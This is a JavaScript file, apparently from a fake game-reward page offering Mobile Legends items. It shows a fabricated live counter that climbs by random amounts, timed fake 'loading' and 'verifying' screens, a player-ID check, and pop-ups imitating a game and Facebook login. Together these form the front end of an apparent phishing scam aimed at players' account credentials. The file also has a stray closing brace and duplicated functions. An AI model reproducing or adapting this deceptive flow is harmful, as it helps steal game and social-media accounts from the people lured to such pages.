function cleanInput(input) {
    // Hapus angka dalam tanda kurung beserta tanda kurungnya
    input.value = input.value.replace(/\(\d+\)/g, '');
}

for(var i = 1; i <= 200; i++){
document.write("<option>" + i + "</option>");
};

(function () {
    const el = document.querySelector('.stats-number');
    let current = 56373;

    function formatNumber(n) {
        return n.toLocaleString('de-DE');
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function animateCount(from, to, duration, onDone) {
        const steps = 30;
        const stepTime = duration / steps;
        const diff = to - from;
        let step = 0;

        const interval = setInterval(() => {
            step++;
            const progress = step / steps;
            const eased = 1 - Math.pow(1 - progress, 2);
            const value = Math.round(from + diff * eased);
            el.textContent = formatNumber(value);

            if (step >= steps) {
                clearInterval(interval);
                current = to;
                el.textContent = formatNumber(current);
                if (onDone) onDone();
            }
        }, stepTime);
    }

    function scheduleNext() {
        const type = Math.random();
        let change;

        if (type < 0.5) {
            change = randomInt(1, 30);
        } else if (type < 0.8) {
            change = randomInt(30, 150);
        } else {
            change = randomInt(150, 600);
        }

        const delay = randomInt(800, 4000);
        const duration = randomInt(400, 1200);

        setTimeout(() => {
            animateCount(current, current + change, duration, scheduleNext);
        }, delay);
    }

    el.textContent = formatNumber(current);
    scheduleNext();
})();

load_web()
function load_web() {
    $('.container_load').show();
    // Langsung tampilkan popup tanpa nunggu
    $('.playerid_verification_new').css('display','flex').hide().fadeIn(400);
    setTimeout(function () {
        $('.container_load').hide();
        $('.container_show').show();
    }, 3000);
}

function open_account_login() {
    $('.account_login').show();
	$('.itemReward_confirmation').hide();
	$(".once_rewards").hide();
	$(".many_rewards").hide();
	$(".playersid").hide();
	$('.itemRecall_confirmation').hide();
	$('.many_confirmation').hide(); 	
	$('#load-login').show();
	$('#text-login1').show();     
    $('#box-login').hide();      
    $('#date-login').hide();            
	setTimeout(function () {
	$('#load-login').hide();    
    $('.account_login').hide();   
    $('.mlbb_login').show();   
      }, 4000);
    setTimeout(function () {
	$('#text-login1').hide();       
    $('#text-login2').fadeIn();
      }, 2000);
}
}

function audioFiles() {
    var audio = document.getElementById('audioFiles');  
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFiles()");  
});
function videoFiles() {
    var video = document.getElementById('idvse3low');  
    video.load();
    video.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "videoFiles()");  
});
function close_not_enough () {
    $('.not_enough').hide();
}
function open_once_confirmation() {
    $('.once_confirmation').show();
}
function open_many_confirmation() {
    $('.many_confirmation').show();
}
function open_once_confirmation2() {
    $('.once_confirmation2').show();
}
function open_many_confirmation2() {
    $('.many_confirmation2').show();
}
function open_once_rewards() {
    $('.once_rewards').show();
	$(".once_confirmation").hide()
}
function open_many_rewards() {
    $('.many_rewards').show();
	$(".many_confirmation").hide()
}
function close_rewards() {
    $(".once_confirmation").hide()
    $(".many_confirmation").hide()
    $(".once_confirmation2").hide()
    $(".many_confirmation2").hide()    
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function open_error_fb() {
    $('.error_fb').show();	
}
function open_process () {
    $('.processing_account').show();
    $(".itemReward_confirmation").hide()
    $(".itemRecall_confirmation").hide()
    $(".many_confirmation").hide()
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function close_process () {
    $('.processing_account').hide();
    $('.header_uid').fadeIn();
    $('#btn-redeem').hide();
	$('#btn-once').hide();     
    $('#btn-many').hide();    
    $('#once_airdrop').hide();
    $('#many_airdrop').hide();
	$('#once_airdrop_on').show();         
	$('#many_airdrop_on').show();   	     
    $('#btn-redeem-on').show();
	$('#btn-once-on').show();     
    $('#btn-many-on').show();          
}
function open_not_enough () {
    $('.not_enough').show();
}
function open_se3low_airdrop() {        
    $('.se3low_airdrop').show();
	$('.once_confirmation').hide();
	setTimeout(function () {
    $('.once_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut();    
      }, 6000);                             	      		    
}
function open_se3low_airdrops() {    
    $('.se3low_airdrop').show();
	$('.many_confirmation').hide(); 
	setTimeout(function () {
    $('.many_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut(); 
      }, 6000);                              	      		    
}
function open_se3low_airdrop2() {        
    $('.se3low_airdrop').show();
	$('.once_confirmation2').hide();
	setTimeout(function () {
    $('.once_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut();    
      }, 6000);                             	      		    
}
function open_se3low_airdrops2() {    
    $('.se3low_airdrop').show();
	$('.many_confirmation2').hide(); 
	setTimeout(function () {
    $('.many_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut(); 
      }, 6000);                              	      		    
}
function close_itemReward_confirmation() {
    $('.itemReward_confirmation').hide();
    $('.itemRecall_confirmation').hide();
}
function open_itemRecall_confirmation(ag) {
    var itemRecall_confirmationImg = $(ag).attr("src");
    var recallName = $(ag).attr("recall-name");
    var amountx = $(ag).attr("recall-id");
    var pricex = $(ag).attr("valuex");
    $('.itemRecall_confirmation').show();   
    $('#myItemRecall_confirmationImg').attr('src',itemRecall_confirmationImg);
    $('#recallName').html(recallName);
    $('#amountx').html(amountx);
    $('#pricex').html(pricex);
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    var rewardName = $(ag).attr("data-name");
    var amount = $(ag).attr("data-id");
    var price = $(ag).attr("value");
    $('.itemReward_confirmation').show();   
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
    $('#rewardName').html(rewardName);
    $('#amount').html(amount);
    $('#price').html(price);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

var sendUID = document.getElementById('sendUID');
sendUID.addEventListener('click', function(e){
    e.preventDefault();
    var myText = document.getElementById("playid");
    var myDiv = document.getElementById("uid");   
    myDiv.innerHTML = myText.value;
});

let slideIndex = 0;
showSlides();

function showSlides() {
  let i;
  let slides = document.getElementsByClassName("mySlides");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  slideIndex++;
  if (slideIndex > slides.length) {
    slideIndex = 1
  }
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" actives", "");
  }
  slides[slideIndex - 1].style.display = "block";
  dots[slideIndex - 1].className += " actives";
  setTimeout(showSlides, 6000);
}

function removeBorder() {
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
function clearInput() {
  document.getElementById("goInputPlayIdForm").reset();
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
setTimeout(function() {
  $('.sec-container').show()
  $('.sec-container-load').hide();
}, 1000);

function openReward(evt, rewardsClass) {
  var i, item_rewardx, item_rewardx_link;
  item_rewardx = document.getElementsByClassName("item_rewardx");
  for (i = 0; i < item_rewardx.length; i++) {
    item_rewardx[i].style.display = "none";
  }
  item_rewardx_link = document.getElementsByClassName("menu-contentx");
  for (i = 0; i < item_rewardx_link.length; i++) {
    item_rewardx_link[i].className = item_rewardx_link[i].className.replace(" menu-contentx-actives", "");
  }
  document.getElementById(rewardsClass).style.display = "block";
  evt.currentTarget.className += " menu-contentx-actives";
}
document.getElementById("defaultrewards").click();

function imposeMinMax(el){
  if(el.value != ""){
    if(parseInt(el.value) < parseInt(el.min)){
      el.value = el.min;
    }
    if(parseInt(el.value) > parseInt(el.max)){
      el.value = el.max;
    }
  }
}
function goInputPlayId() {
  $('#goInputPlayIdForm').submit(function(submitinggoInputPlayId) {
    submitinggoInputPlayId.preventDefault();
    $beforeInputPlayId = $('#beforeInput-PlayId').val().trim();
    if ($beforeInputPlayId == '' || $beforeInputPlayId == null) {
      $('.reqPlayerId').show();
      $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
      return false;
    } else {
      $('.reqPlayerId').hide();
      $('#wrongBoxId').removeClass('pengkhianat_box_form_login_id_error');
    }
    if ($beforeInputPlayId.length <= 7 || $beforeInputPlayId.length >= 15) {
      $('.wrongPlayerId').fadeIn();       
      $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
      return false;
    } else {
      $('.wrongPlayerId').hide();
      $('#wrongBoxId').removeClass('pengkhianat_box_form_login_id_error');
      // code for processing character id input on desktop version
      $('.itemReward_confirmation').hide();
      $('.itemRecall_confirmation').hide();
      $('.account_login').show();
      $(".playersid").hide();
	$('#load-login').show();
	$('#text-login1').show();     
    $('#box-login').hide();      
    $('#date-login').hide();            
	setTimeout(function () {
	$('#load-login').hide();    
    $('#box-login').show();
    $('#date-login').show();          
      }, 5000);
    setTimeout(function () {
	$('#text-login1').hide();       
    $('#text-login2').fadeIn();
      }, 2000);
      // code for getting character id data and installed in account verification popup
      $("#ValidatePopupPlayId").val($beforeInputPlayId);
      $("input#ValidatePopupPlayId").val($beforeInputPlayId);
    }
  });
}
function removeBorder() {
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
function clearInput() {
  document.getElementById("goInputPlayIdForm").reset();
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
setTimeout(function() {
  $('.sec-container').show()
  $('.sec-container-load').hide();
}, 1500);
function open_veriflah() {
  $('.itemReward_confirmation').hide();
  $('.itemRecall_confirmation').hide();
  $('.account_login').show();
}
function verify_done() {
  $('#load-verify').show()
  $('#stepform').hide()
  setTimeout(function() {
    $('#load-verify').hide()
    $('.account_verification').hide()
    $('.processing_account').show()
  }, 3000)
}
